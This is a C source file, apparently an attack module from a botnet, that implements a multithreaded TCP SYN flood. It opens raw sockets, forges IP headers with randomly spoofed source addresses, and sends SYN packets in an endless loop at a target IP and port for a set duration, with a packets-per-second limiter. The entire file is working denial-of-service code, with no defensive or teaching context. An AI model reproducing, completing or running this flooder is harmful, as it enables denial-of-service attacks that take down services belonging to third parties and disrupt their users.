/*
 * TCP Advanced ESSYN script
 */
#define _GNU_SOURCE
#include <time.h>
#include <stdio.h>
#include <netdb.h>
#include <net/if.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>

#include <command.h>
#include <dict.h>

#define THREADS_MAX 6
#define PPS_LIMIT 10000 // -1: no limit

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
unsigned short csum(unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while (count > 1)
    {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0)
    {
        sum += *(unsigned char *)buf;
    }
    while (sum >> 16)
    {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;

    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));

    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo),
           (unsigned char *)tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr(dict_get(ATK_LOCAL_ADDR));
}

void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(5678);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0)
    {
#ifdef DEBUG
        fprintf(stderr, "[ESSYN] Could not open raw socket.\n");
#endif
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);

    tcph->dest = htons(floodport);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);

    int tmp = 1;
    const int *val = &tmp;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
    {
#ifdef DEBUG
        fprintf(stderr, "[ESSYN] Error: setsockopt() - Cannot set HDRINCL!\n");
#endif
        exit(-1);
    }

    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while (1)
    {
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 |
                     (rand_cmwc() >> 16 & 0xFF) << 16 |
                     (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);

        pps++;
        if (i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}

/**
 * Params:
 *  target IP
 *  port to be flooded
 *  time (duration)
 */
void atk_start_tcp_essyn(char *target_ip, int target_port, int duration)
{

#ifdef DEBUG
    fprintf(stdout, "[ESSYN] Setting up Sockets...\n");
#endif

    int num_threads = THREADS_MAX;
    floodport = target_port;
    int maxpps = PPS_LIMIT;
    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];

    int multiplier = 20;

    int i;
    for (i = 0; i < num_threads; i++)
    {
        pthread_create(&thread[i], NULL, &flood, (void *)target_ip);
    }

#ifdef DEBUG
    fprintf(stdout, "[ESSYN] Starting Flood...\n");
#endif

    for (i = 0; i < (duration * multiplier); i++)
    {
        usleep((1000 / multiplier) * 1000);
        if ((pps * multiplier) > maxpps)
        {

            if (1 > limiter)
                sleeptime += 100;
            else
                limiter--;
        }
        else
        {
            limiter++;

            if (sleeptime > 25)
                sleeptime -= 25;
            else
                sleeptime = 0;
        }
        pps = 0;
    }

    return;
}
